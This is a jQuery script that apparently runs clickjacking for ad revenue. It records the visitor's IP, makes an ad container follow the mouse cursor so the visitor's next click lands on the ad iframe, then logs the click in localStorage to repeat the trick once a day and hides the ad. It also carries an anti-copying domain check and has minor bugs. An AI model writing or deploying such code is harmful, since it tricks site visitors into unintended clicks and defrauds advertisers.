$(document).ready(function(){
	var urlfile = $('#link').attr('src');
	urlfile = urlfile.substring(0,30);
	if(urlfile == 'http://www.adsmaster.net23.net'){
		var entrar = false;
		var mypublic;
		var time = 0;
		if(!localStorage.getItem('ip')){
			var ip;
			var dia;
			var mes;
			var ano;
		}else{
			var ip=localStorage.getItem("ip");
			var dia=localStorage.getItem("dia");
			var mes=localStorage.getItem("mes");
			var ano=localStorage.getItem("ano");
		}
		function GetIP(){
			$.getJSON("https://api.ipify.org?format=json",function(data){
				ip = data.ip;
				var fecha = new Date();
				dia = fecha.getDate();
				mes = fecha.getMonth() + 1;
				ano = fecha.getFullYear();
			});
		}
		function getQueryParams(qs) {
			qs = qs.split("+").join(" ");
			var params = {},
			tokens,
			re = /[?&]?([^=]+)=([^&]*)/g;
			while (tokens = re.exec(qs)) {
				params[decodeURIComponent(tokens[1])]
					= decodeURIComponent(tokens[2]);
			}
			return params;
		}
		var varsGet = getQueryParams($(location).attr('search'));
		if(varsGet["show"]=="s"){
			localStorage.clear();
			$('#content-ads').css("opacity","3");
		}else if(varsGet["show"]=="n"){
			localStorage.clear();
		}
		if(varsGet["ads"] == "si"){
			entrar = true;
		}else{
			$('#content-ads').css("position","relative");
			$('#content-ads').css("opacity","3");
		}
		if(varsGet["time"]){
			time = varsGet["time"]*1000;
		}
		if(entrar){
			setTimeout(logicaNegocio,time);
		}
		function logicaNegocio(){
			GetIP();
			if(window['localStorage']){
				if(localStorage.getItem("ip")){
					if(localStorage.getItem("ip") == ip){
						if(localStorage.getItem("mes") == mes){
							if(localStorage.getItem("dia") == dia){
								valido = false;
								movepoint(valido);
							}else{
								valido = true;
								movepoint(valido);
							}
						}else{
							valido = true;
							movepoint(valido);
						}
					}else{
						valido = true;
						movepoint(valido);
					}
				}else{
					valido = true;
					movepoint(valido);
				}
			}else{
				valido = true;
				movepoint(v)
			}
			function movepoint(v){
				if(v){
					$("div#content-ads").mouseenter(function(){ 
					   	console.log($(this));
					   	mypublic = $(this);
					});
				   	function hide_publicidad(i){
				    	valor = setInterval(function(){
					        if(i>1){
								mypublic.css("display","none");
								clearInterval(valor);
					        }
					        i++;
				    	},500);
				   	}
					function clickActivo(){
						return $(document.activeElement).is('IFRAME') || $(document.activeElement).is('iframe');
				   	}
					var ant = setInterval(function(){
						if(clickActivo()){
							localStorage.setItem("ip",ip);
							localStorage.setItem("dia",dia);
							localStorage.setItem("mes",mes);
							localStorage.setItem("ano",ano);
							hide_publicidad(1);
							clearInterval(ant);
						}
					},100);
					$(document).mousemove(function(e){
						$("div#content-ads").css( {"top":(e.clientY-140), "left":(e.clientX-168) });
					});
				}else{
					var padre = document.getElementById("content-ads").parentNode;
					var hijo = document.getElementById("content-ads");
					padre.removeChild(hijo);
				}
			}
		}
	}else{
		alert("¡No te servira el código, por plagiador!");
	}
});
